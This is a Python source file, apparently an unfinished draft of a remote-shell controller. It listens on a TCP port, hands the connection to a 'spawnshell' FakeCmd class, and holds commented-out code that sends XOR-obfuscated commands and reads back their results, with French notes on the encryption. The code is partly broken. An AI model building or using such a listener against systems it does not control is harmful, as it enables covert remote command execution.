import socket
from spawnshell import FakeCmd




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(("",12345))
sock.listen(5)



uni = "Ελληνικά J"
uni_encode = "Ελληνικά".encode()

conn,address = sock.accept()

print("CONNECT: {}:{}".format(address[0], address[1]))

tmp = ""
result = ""


FakeCmd(sock).main()
print("finish")    
    
'''
cmd_xor = XOREncryption(inp, MY_KEY)
conn.send(cmd_xor.encode("utf-16-le"))

while True:

    result_xor = conn.recv(20000)

    result = XOREncryption(result_xor.decode("utf-16-le"),MY_KEY)
    print("--->",result)
    
    print("len result: ",len(result))  
    print("result Xor: ",len(result_xor))  
    if(result == "\r\n"):
        print("bye")
        break
'''

'''
    ok 
    print("wait..")
    data = conn.recv(4096).decode("utf-16-le")
    print(data)
    print("len: ",len(data))
    print("\n\n")
    inp = "абвгдеж эюя абвгдеж эюя  fántǐzì".encode("utf-16-le")  #https://stackoverflow.com/questions/13499920/what-unicode-encoding-utf-8-utf-16-other-does-windows-use-for-its-unicode-da#:~:text=1%20Answer&text=The%20values%20stored%20in%20memory,16%20little%2Dendian%2C%20always.
    conn.send(inp)
    print("send: ", inp)
    print(len(inp.decode("utf-16-le")))
    #https://stackoverflow.com/questions/46799465/why-my-applicaion-cannot-display-unicode-character-correctly
'''

'''
Il faudrait a partir d'un nombre chiffrer via xor et non a partir d'un char.

https://www.educative.io/edpresso/how-to-convert-strings-to-bytes-in-python
Un objet byte est une séquence d'octets.
'''